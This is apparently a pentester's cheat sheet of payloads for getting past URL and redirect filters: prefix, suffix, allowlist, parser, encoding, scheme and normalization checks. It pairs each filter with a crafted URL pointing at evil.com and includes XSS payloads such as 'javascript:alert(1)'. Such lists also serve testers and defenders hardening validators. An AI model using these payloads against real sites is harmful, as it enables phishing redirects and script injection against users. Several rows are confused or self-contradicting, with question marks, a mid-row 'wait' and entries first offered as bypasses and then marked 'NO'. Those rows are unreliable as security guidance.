# Filter bypasses (deep) — every filter shape and its bypass

## The prefix filters — "must start with X"

| Filter | Bypass | Why |
|---|---|---|
| `startswith('/')` | `//evil.com` | a scheme-relative URL — starts `/`, host=`evil.com` |
| `startswith('/')` | `/\evil.com` | a backslash — the browser normalizes to `/` |
| `startswith('/')` | `/\/evil.com` | the `/\` mix — browsers treat `\` as `/` |
| `startswith('/')` | `/evil.com` | stays-relative — NOT a bypass (a negative) |
| `startswith('https://')` | `https://evil.com` | any `https://` host passes |
| `startswith('https://target.com')` | `https://target.com.evil.com` | the suffix |
| `startswith('https://target.com/')` | `https://target.com.evil.com/` | the suffix |
| `startswith('https://target.com')` | `https://target.com@evil.com` | userinfo — the host is `evil.com` |
| `startswith('https://')` | `https:/\evil.com` | a backslash after the scheme |
| `startswith('/')` | `\\evil.com` | UNC-style — some parsers treat as host |
| `startswith('/')` | `/%5cevil.com` | an encoded `\` |
| `startswith('/')` | `/./evil.com`→`?` | a relative-looking that resolves out |
| `startswith('https://')` | `HTTPS://evil.com` | a case-mismatch the startswith misses |

## The suffix/contains filters — "must contain/end with target.com"

| Filter | Bypass | Why |
|---|---|---|
| `contains('target.com')` | `evil.com/target.com` | the string is in the PATH, host=`evil.com` |
| `contains('target.com')` | `evil.com?target.com` | in the QUERY |
| `contains('target.com')` | `evil.com#target.com` | in the FRAGMENT |
| `contains('target.com')` | `target.com.evil.com` | a subdomain |
| `contains('target.com')` | `target-com.evil.com` | a similar-name |
| `endswith('target.com')` | `eviltarget.com` | no dot-boundary — the suffix matches |
| `endswith('.target.com')` | `x.target.com.evil.com`? | no — the `.` boundary helps; `eviltarget.com` fails but `evil.xtarget.com`... |
| `endswith('target.com')` | `target.com.evil.com`? | no — ends with `evil.com`; the host IS `evil.com` — wait, the HOST `target.com.evil.com` ENDS with `evil.com` not `target.com` — NOT a bypass for endswith-host |
| `endswith('target.com')` on the URL-string | `https://evil.com/x/target.com` | the STRING ends with target.com, host=`evil.com` |
| `endswith('target.com')` on the URL-string | `https://evil.com/target.com` | the path ends with it |

## The allowlist filters — "host must be in [a,b,c]"

| Filter | Bypass | Why |
|---|---|---|
| `host in [target.com]` | `target.com.evil.com`? | NO — the parsed host is `target.com.evil.com`, not in the list — UNLESS the check is `endswith`/`contains` |
| `host in [target.com]` | `target.com@evil.com` | userinfo — `urllib` host=`evil.com`, a naive check reads `target.com` |
| `host in [target.com]` | `evil.com\@target.com` | the `\@` — browser reads host=`target.com` or `evil.com\@` differently |
| `host in [target.com]` | `evil.com#@target.com` | the `#` fragment trick |
| `host in [target.com]` | `evil.com?.target.com` | the `?` |
| `host in [target.com]` | a whitelisted SUBDOMAIN — `x.target.com` if `*.target.com` | a subdomain takeover / a wildcard allowlist |
| `host in [target.com]` | `target.com.evil.com` when the check is `parse().hostname in [target.com]` | NO — the parsed host is `target.com.evil.com` — the check WOULD fail; only a substring/`endswith` filter lets this |
| `host in [a]` | `http://a.` (the trailing-dot) | `a.` == `a` to DNS, not to a string check |

## The parser-boundary filters — "the URL is parsed by X"

| Filter | Bypass | Why |
|---|---|---|
| `urllib.parse` host-read | `https://target.com@evil.com` | `hostname`=`evil.com`; a regex-string check sees `target.com` |
| `urllib.parse` host-read | `https://evil.com\@target.com` | `hostname`=`target.com`? or `evil.com`? — the `\@` parses differently |
| `urlparse` host-read | `https://evil.com#@target.com` | the `#` — `fragment` swallows `@target.com` |
| `urlparse` host-read | `https://evil.com?@target.com` | the `?` — `query` swallows it |
| a naive regex | `https://target.com.evil.com` | the regex sees `target.com` substring |
| `urlsplit`/`urlparse` | `https://evil.com%5c.target.com` | an encoded `\` the parser keeps |
| `urlparse` | `https:%2f%2fevil.com` | an encoded scheme-sep |
| `urlparse` | `https:evil.com` | a scheme with no `//` — `hostname`=None, a check `host==target.com`... |
| `urlparse` | `//evil.com` | scheme-relative — `scheme`='', `hostname`=`evil.com` |
| `urlparse` | `//evil.com?@target.com`/`//evil.com#@target.com` | a scheme-relative + the fragment/query |
| `urlparse` | `evil.com%40target.com` | an encoded `@` |
| `urlparse` | `evil.com%23target.com`/`evil.com%3ftarget.com` | encoded `#`/`?` |

## The encoding filters — "the param is URL-encoded"

| Filter | Bypass | Why |
|---|---|---|
| the check runs on the encoded string | `https%3a%2f%2fevil.com` | the decoded host is `evil.com` |
| the check runs on the encoded string | `https%3a%2f%2ftarget.com.evil.com` | a decoded substring |
| a double-decode | `https%253a%252f%252fevil.com` | two levels of encoding |
| a mixed decode | `https%3a//evil.com` | partial encoding |
| a `+`-decode | `https://evil.com%2f%3f%40target.com` | encoded chars in the path |
| a unicode-decode | `https://evil.com%ef%bc%8f%ef%bc%8ftarget.com` | fullwidth `／` |
| a b64 decode | `?next=aHR0cHM6Ly9ldmlsLmNvbQ==` | the param is b64-decoded first |

## The protocol filters — "the scheme must be http/https"

| Filter | Bypass | Why |
|---|---|---|
| `scheme in [http,https]` | `javascript:alert(1)` | a different scheme — XSS |
| `scheme in [http,https]` | `javascript://%0aalert(1)` | a comment-obfuscated `javascript:` |
| `scheme in [http,https]` | `data:text/html,<script>` | a `data:` URI — XSS |
| `scheme in [http,https]` | `vbscript:msgbox(1)` | a `vbscript:` — legacy IE |
| `scheme required` | `//evil.com` | scheme-relative — `scheme`='' |
| `scheme in [https]` | `https://evil.com` | any https host |
| `scheme in [https]` | `HTTPS://evil.com` | a case-variant |
| `scheme in [https]` | `https:/\/evil.com` | a backslash |
| `scheme in [https]` | `https:evil.com` | a scheme with no `//` |

## The canonicalization filters — "the URL is normalized"

| Filter | Bypass | Why |
|---|---|---|
| a `urljoin`/`resolve` that collapses `..` | `https://target.com/../@evil.com` | the `..`/`@` interaction |
| a `lowercase()` check | `HTTPS://EVIL.COM` | case |
| a `strip()` check | `%20https://evil.com`/` https://evil.com` | whitespace |
| a `unquote` before the check | `https%3a%2f%2fevil.com` | a decode-order |
| a `unquote` AFTER the check | the encoded form passes | decode-order |

## The bypass-record

`bypass: <the-filter>: <the-bypass-shape>: <the-parsed-host>` — each
filter shape + the bypass that defeats it + the host the browser reads.
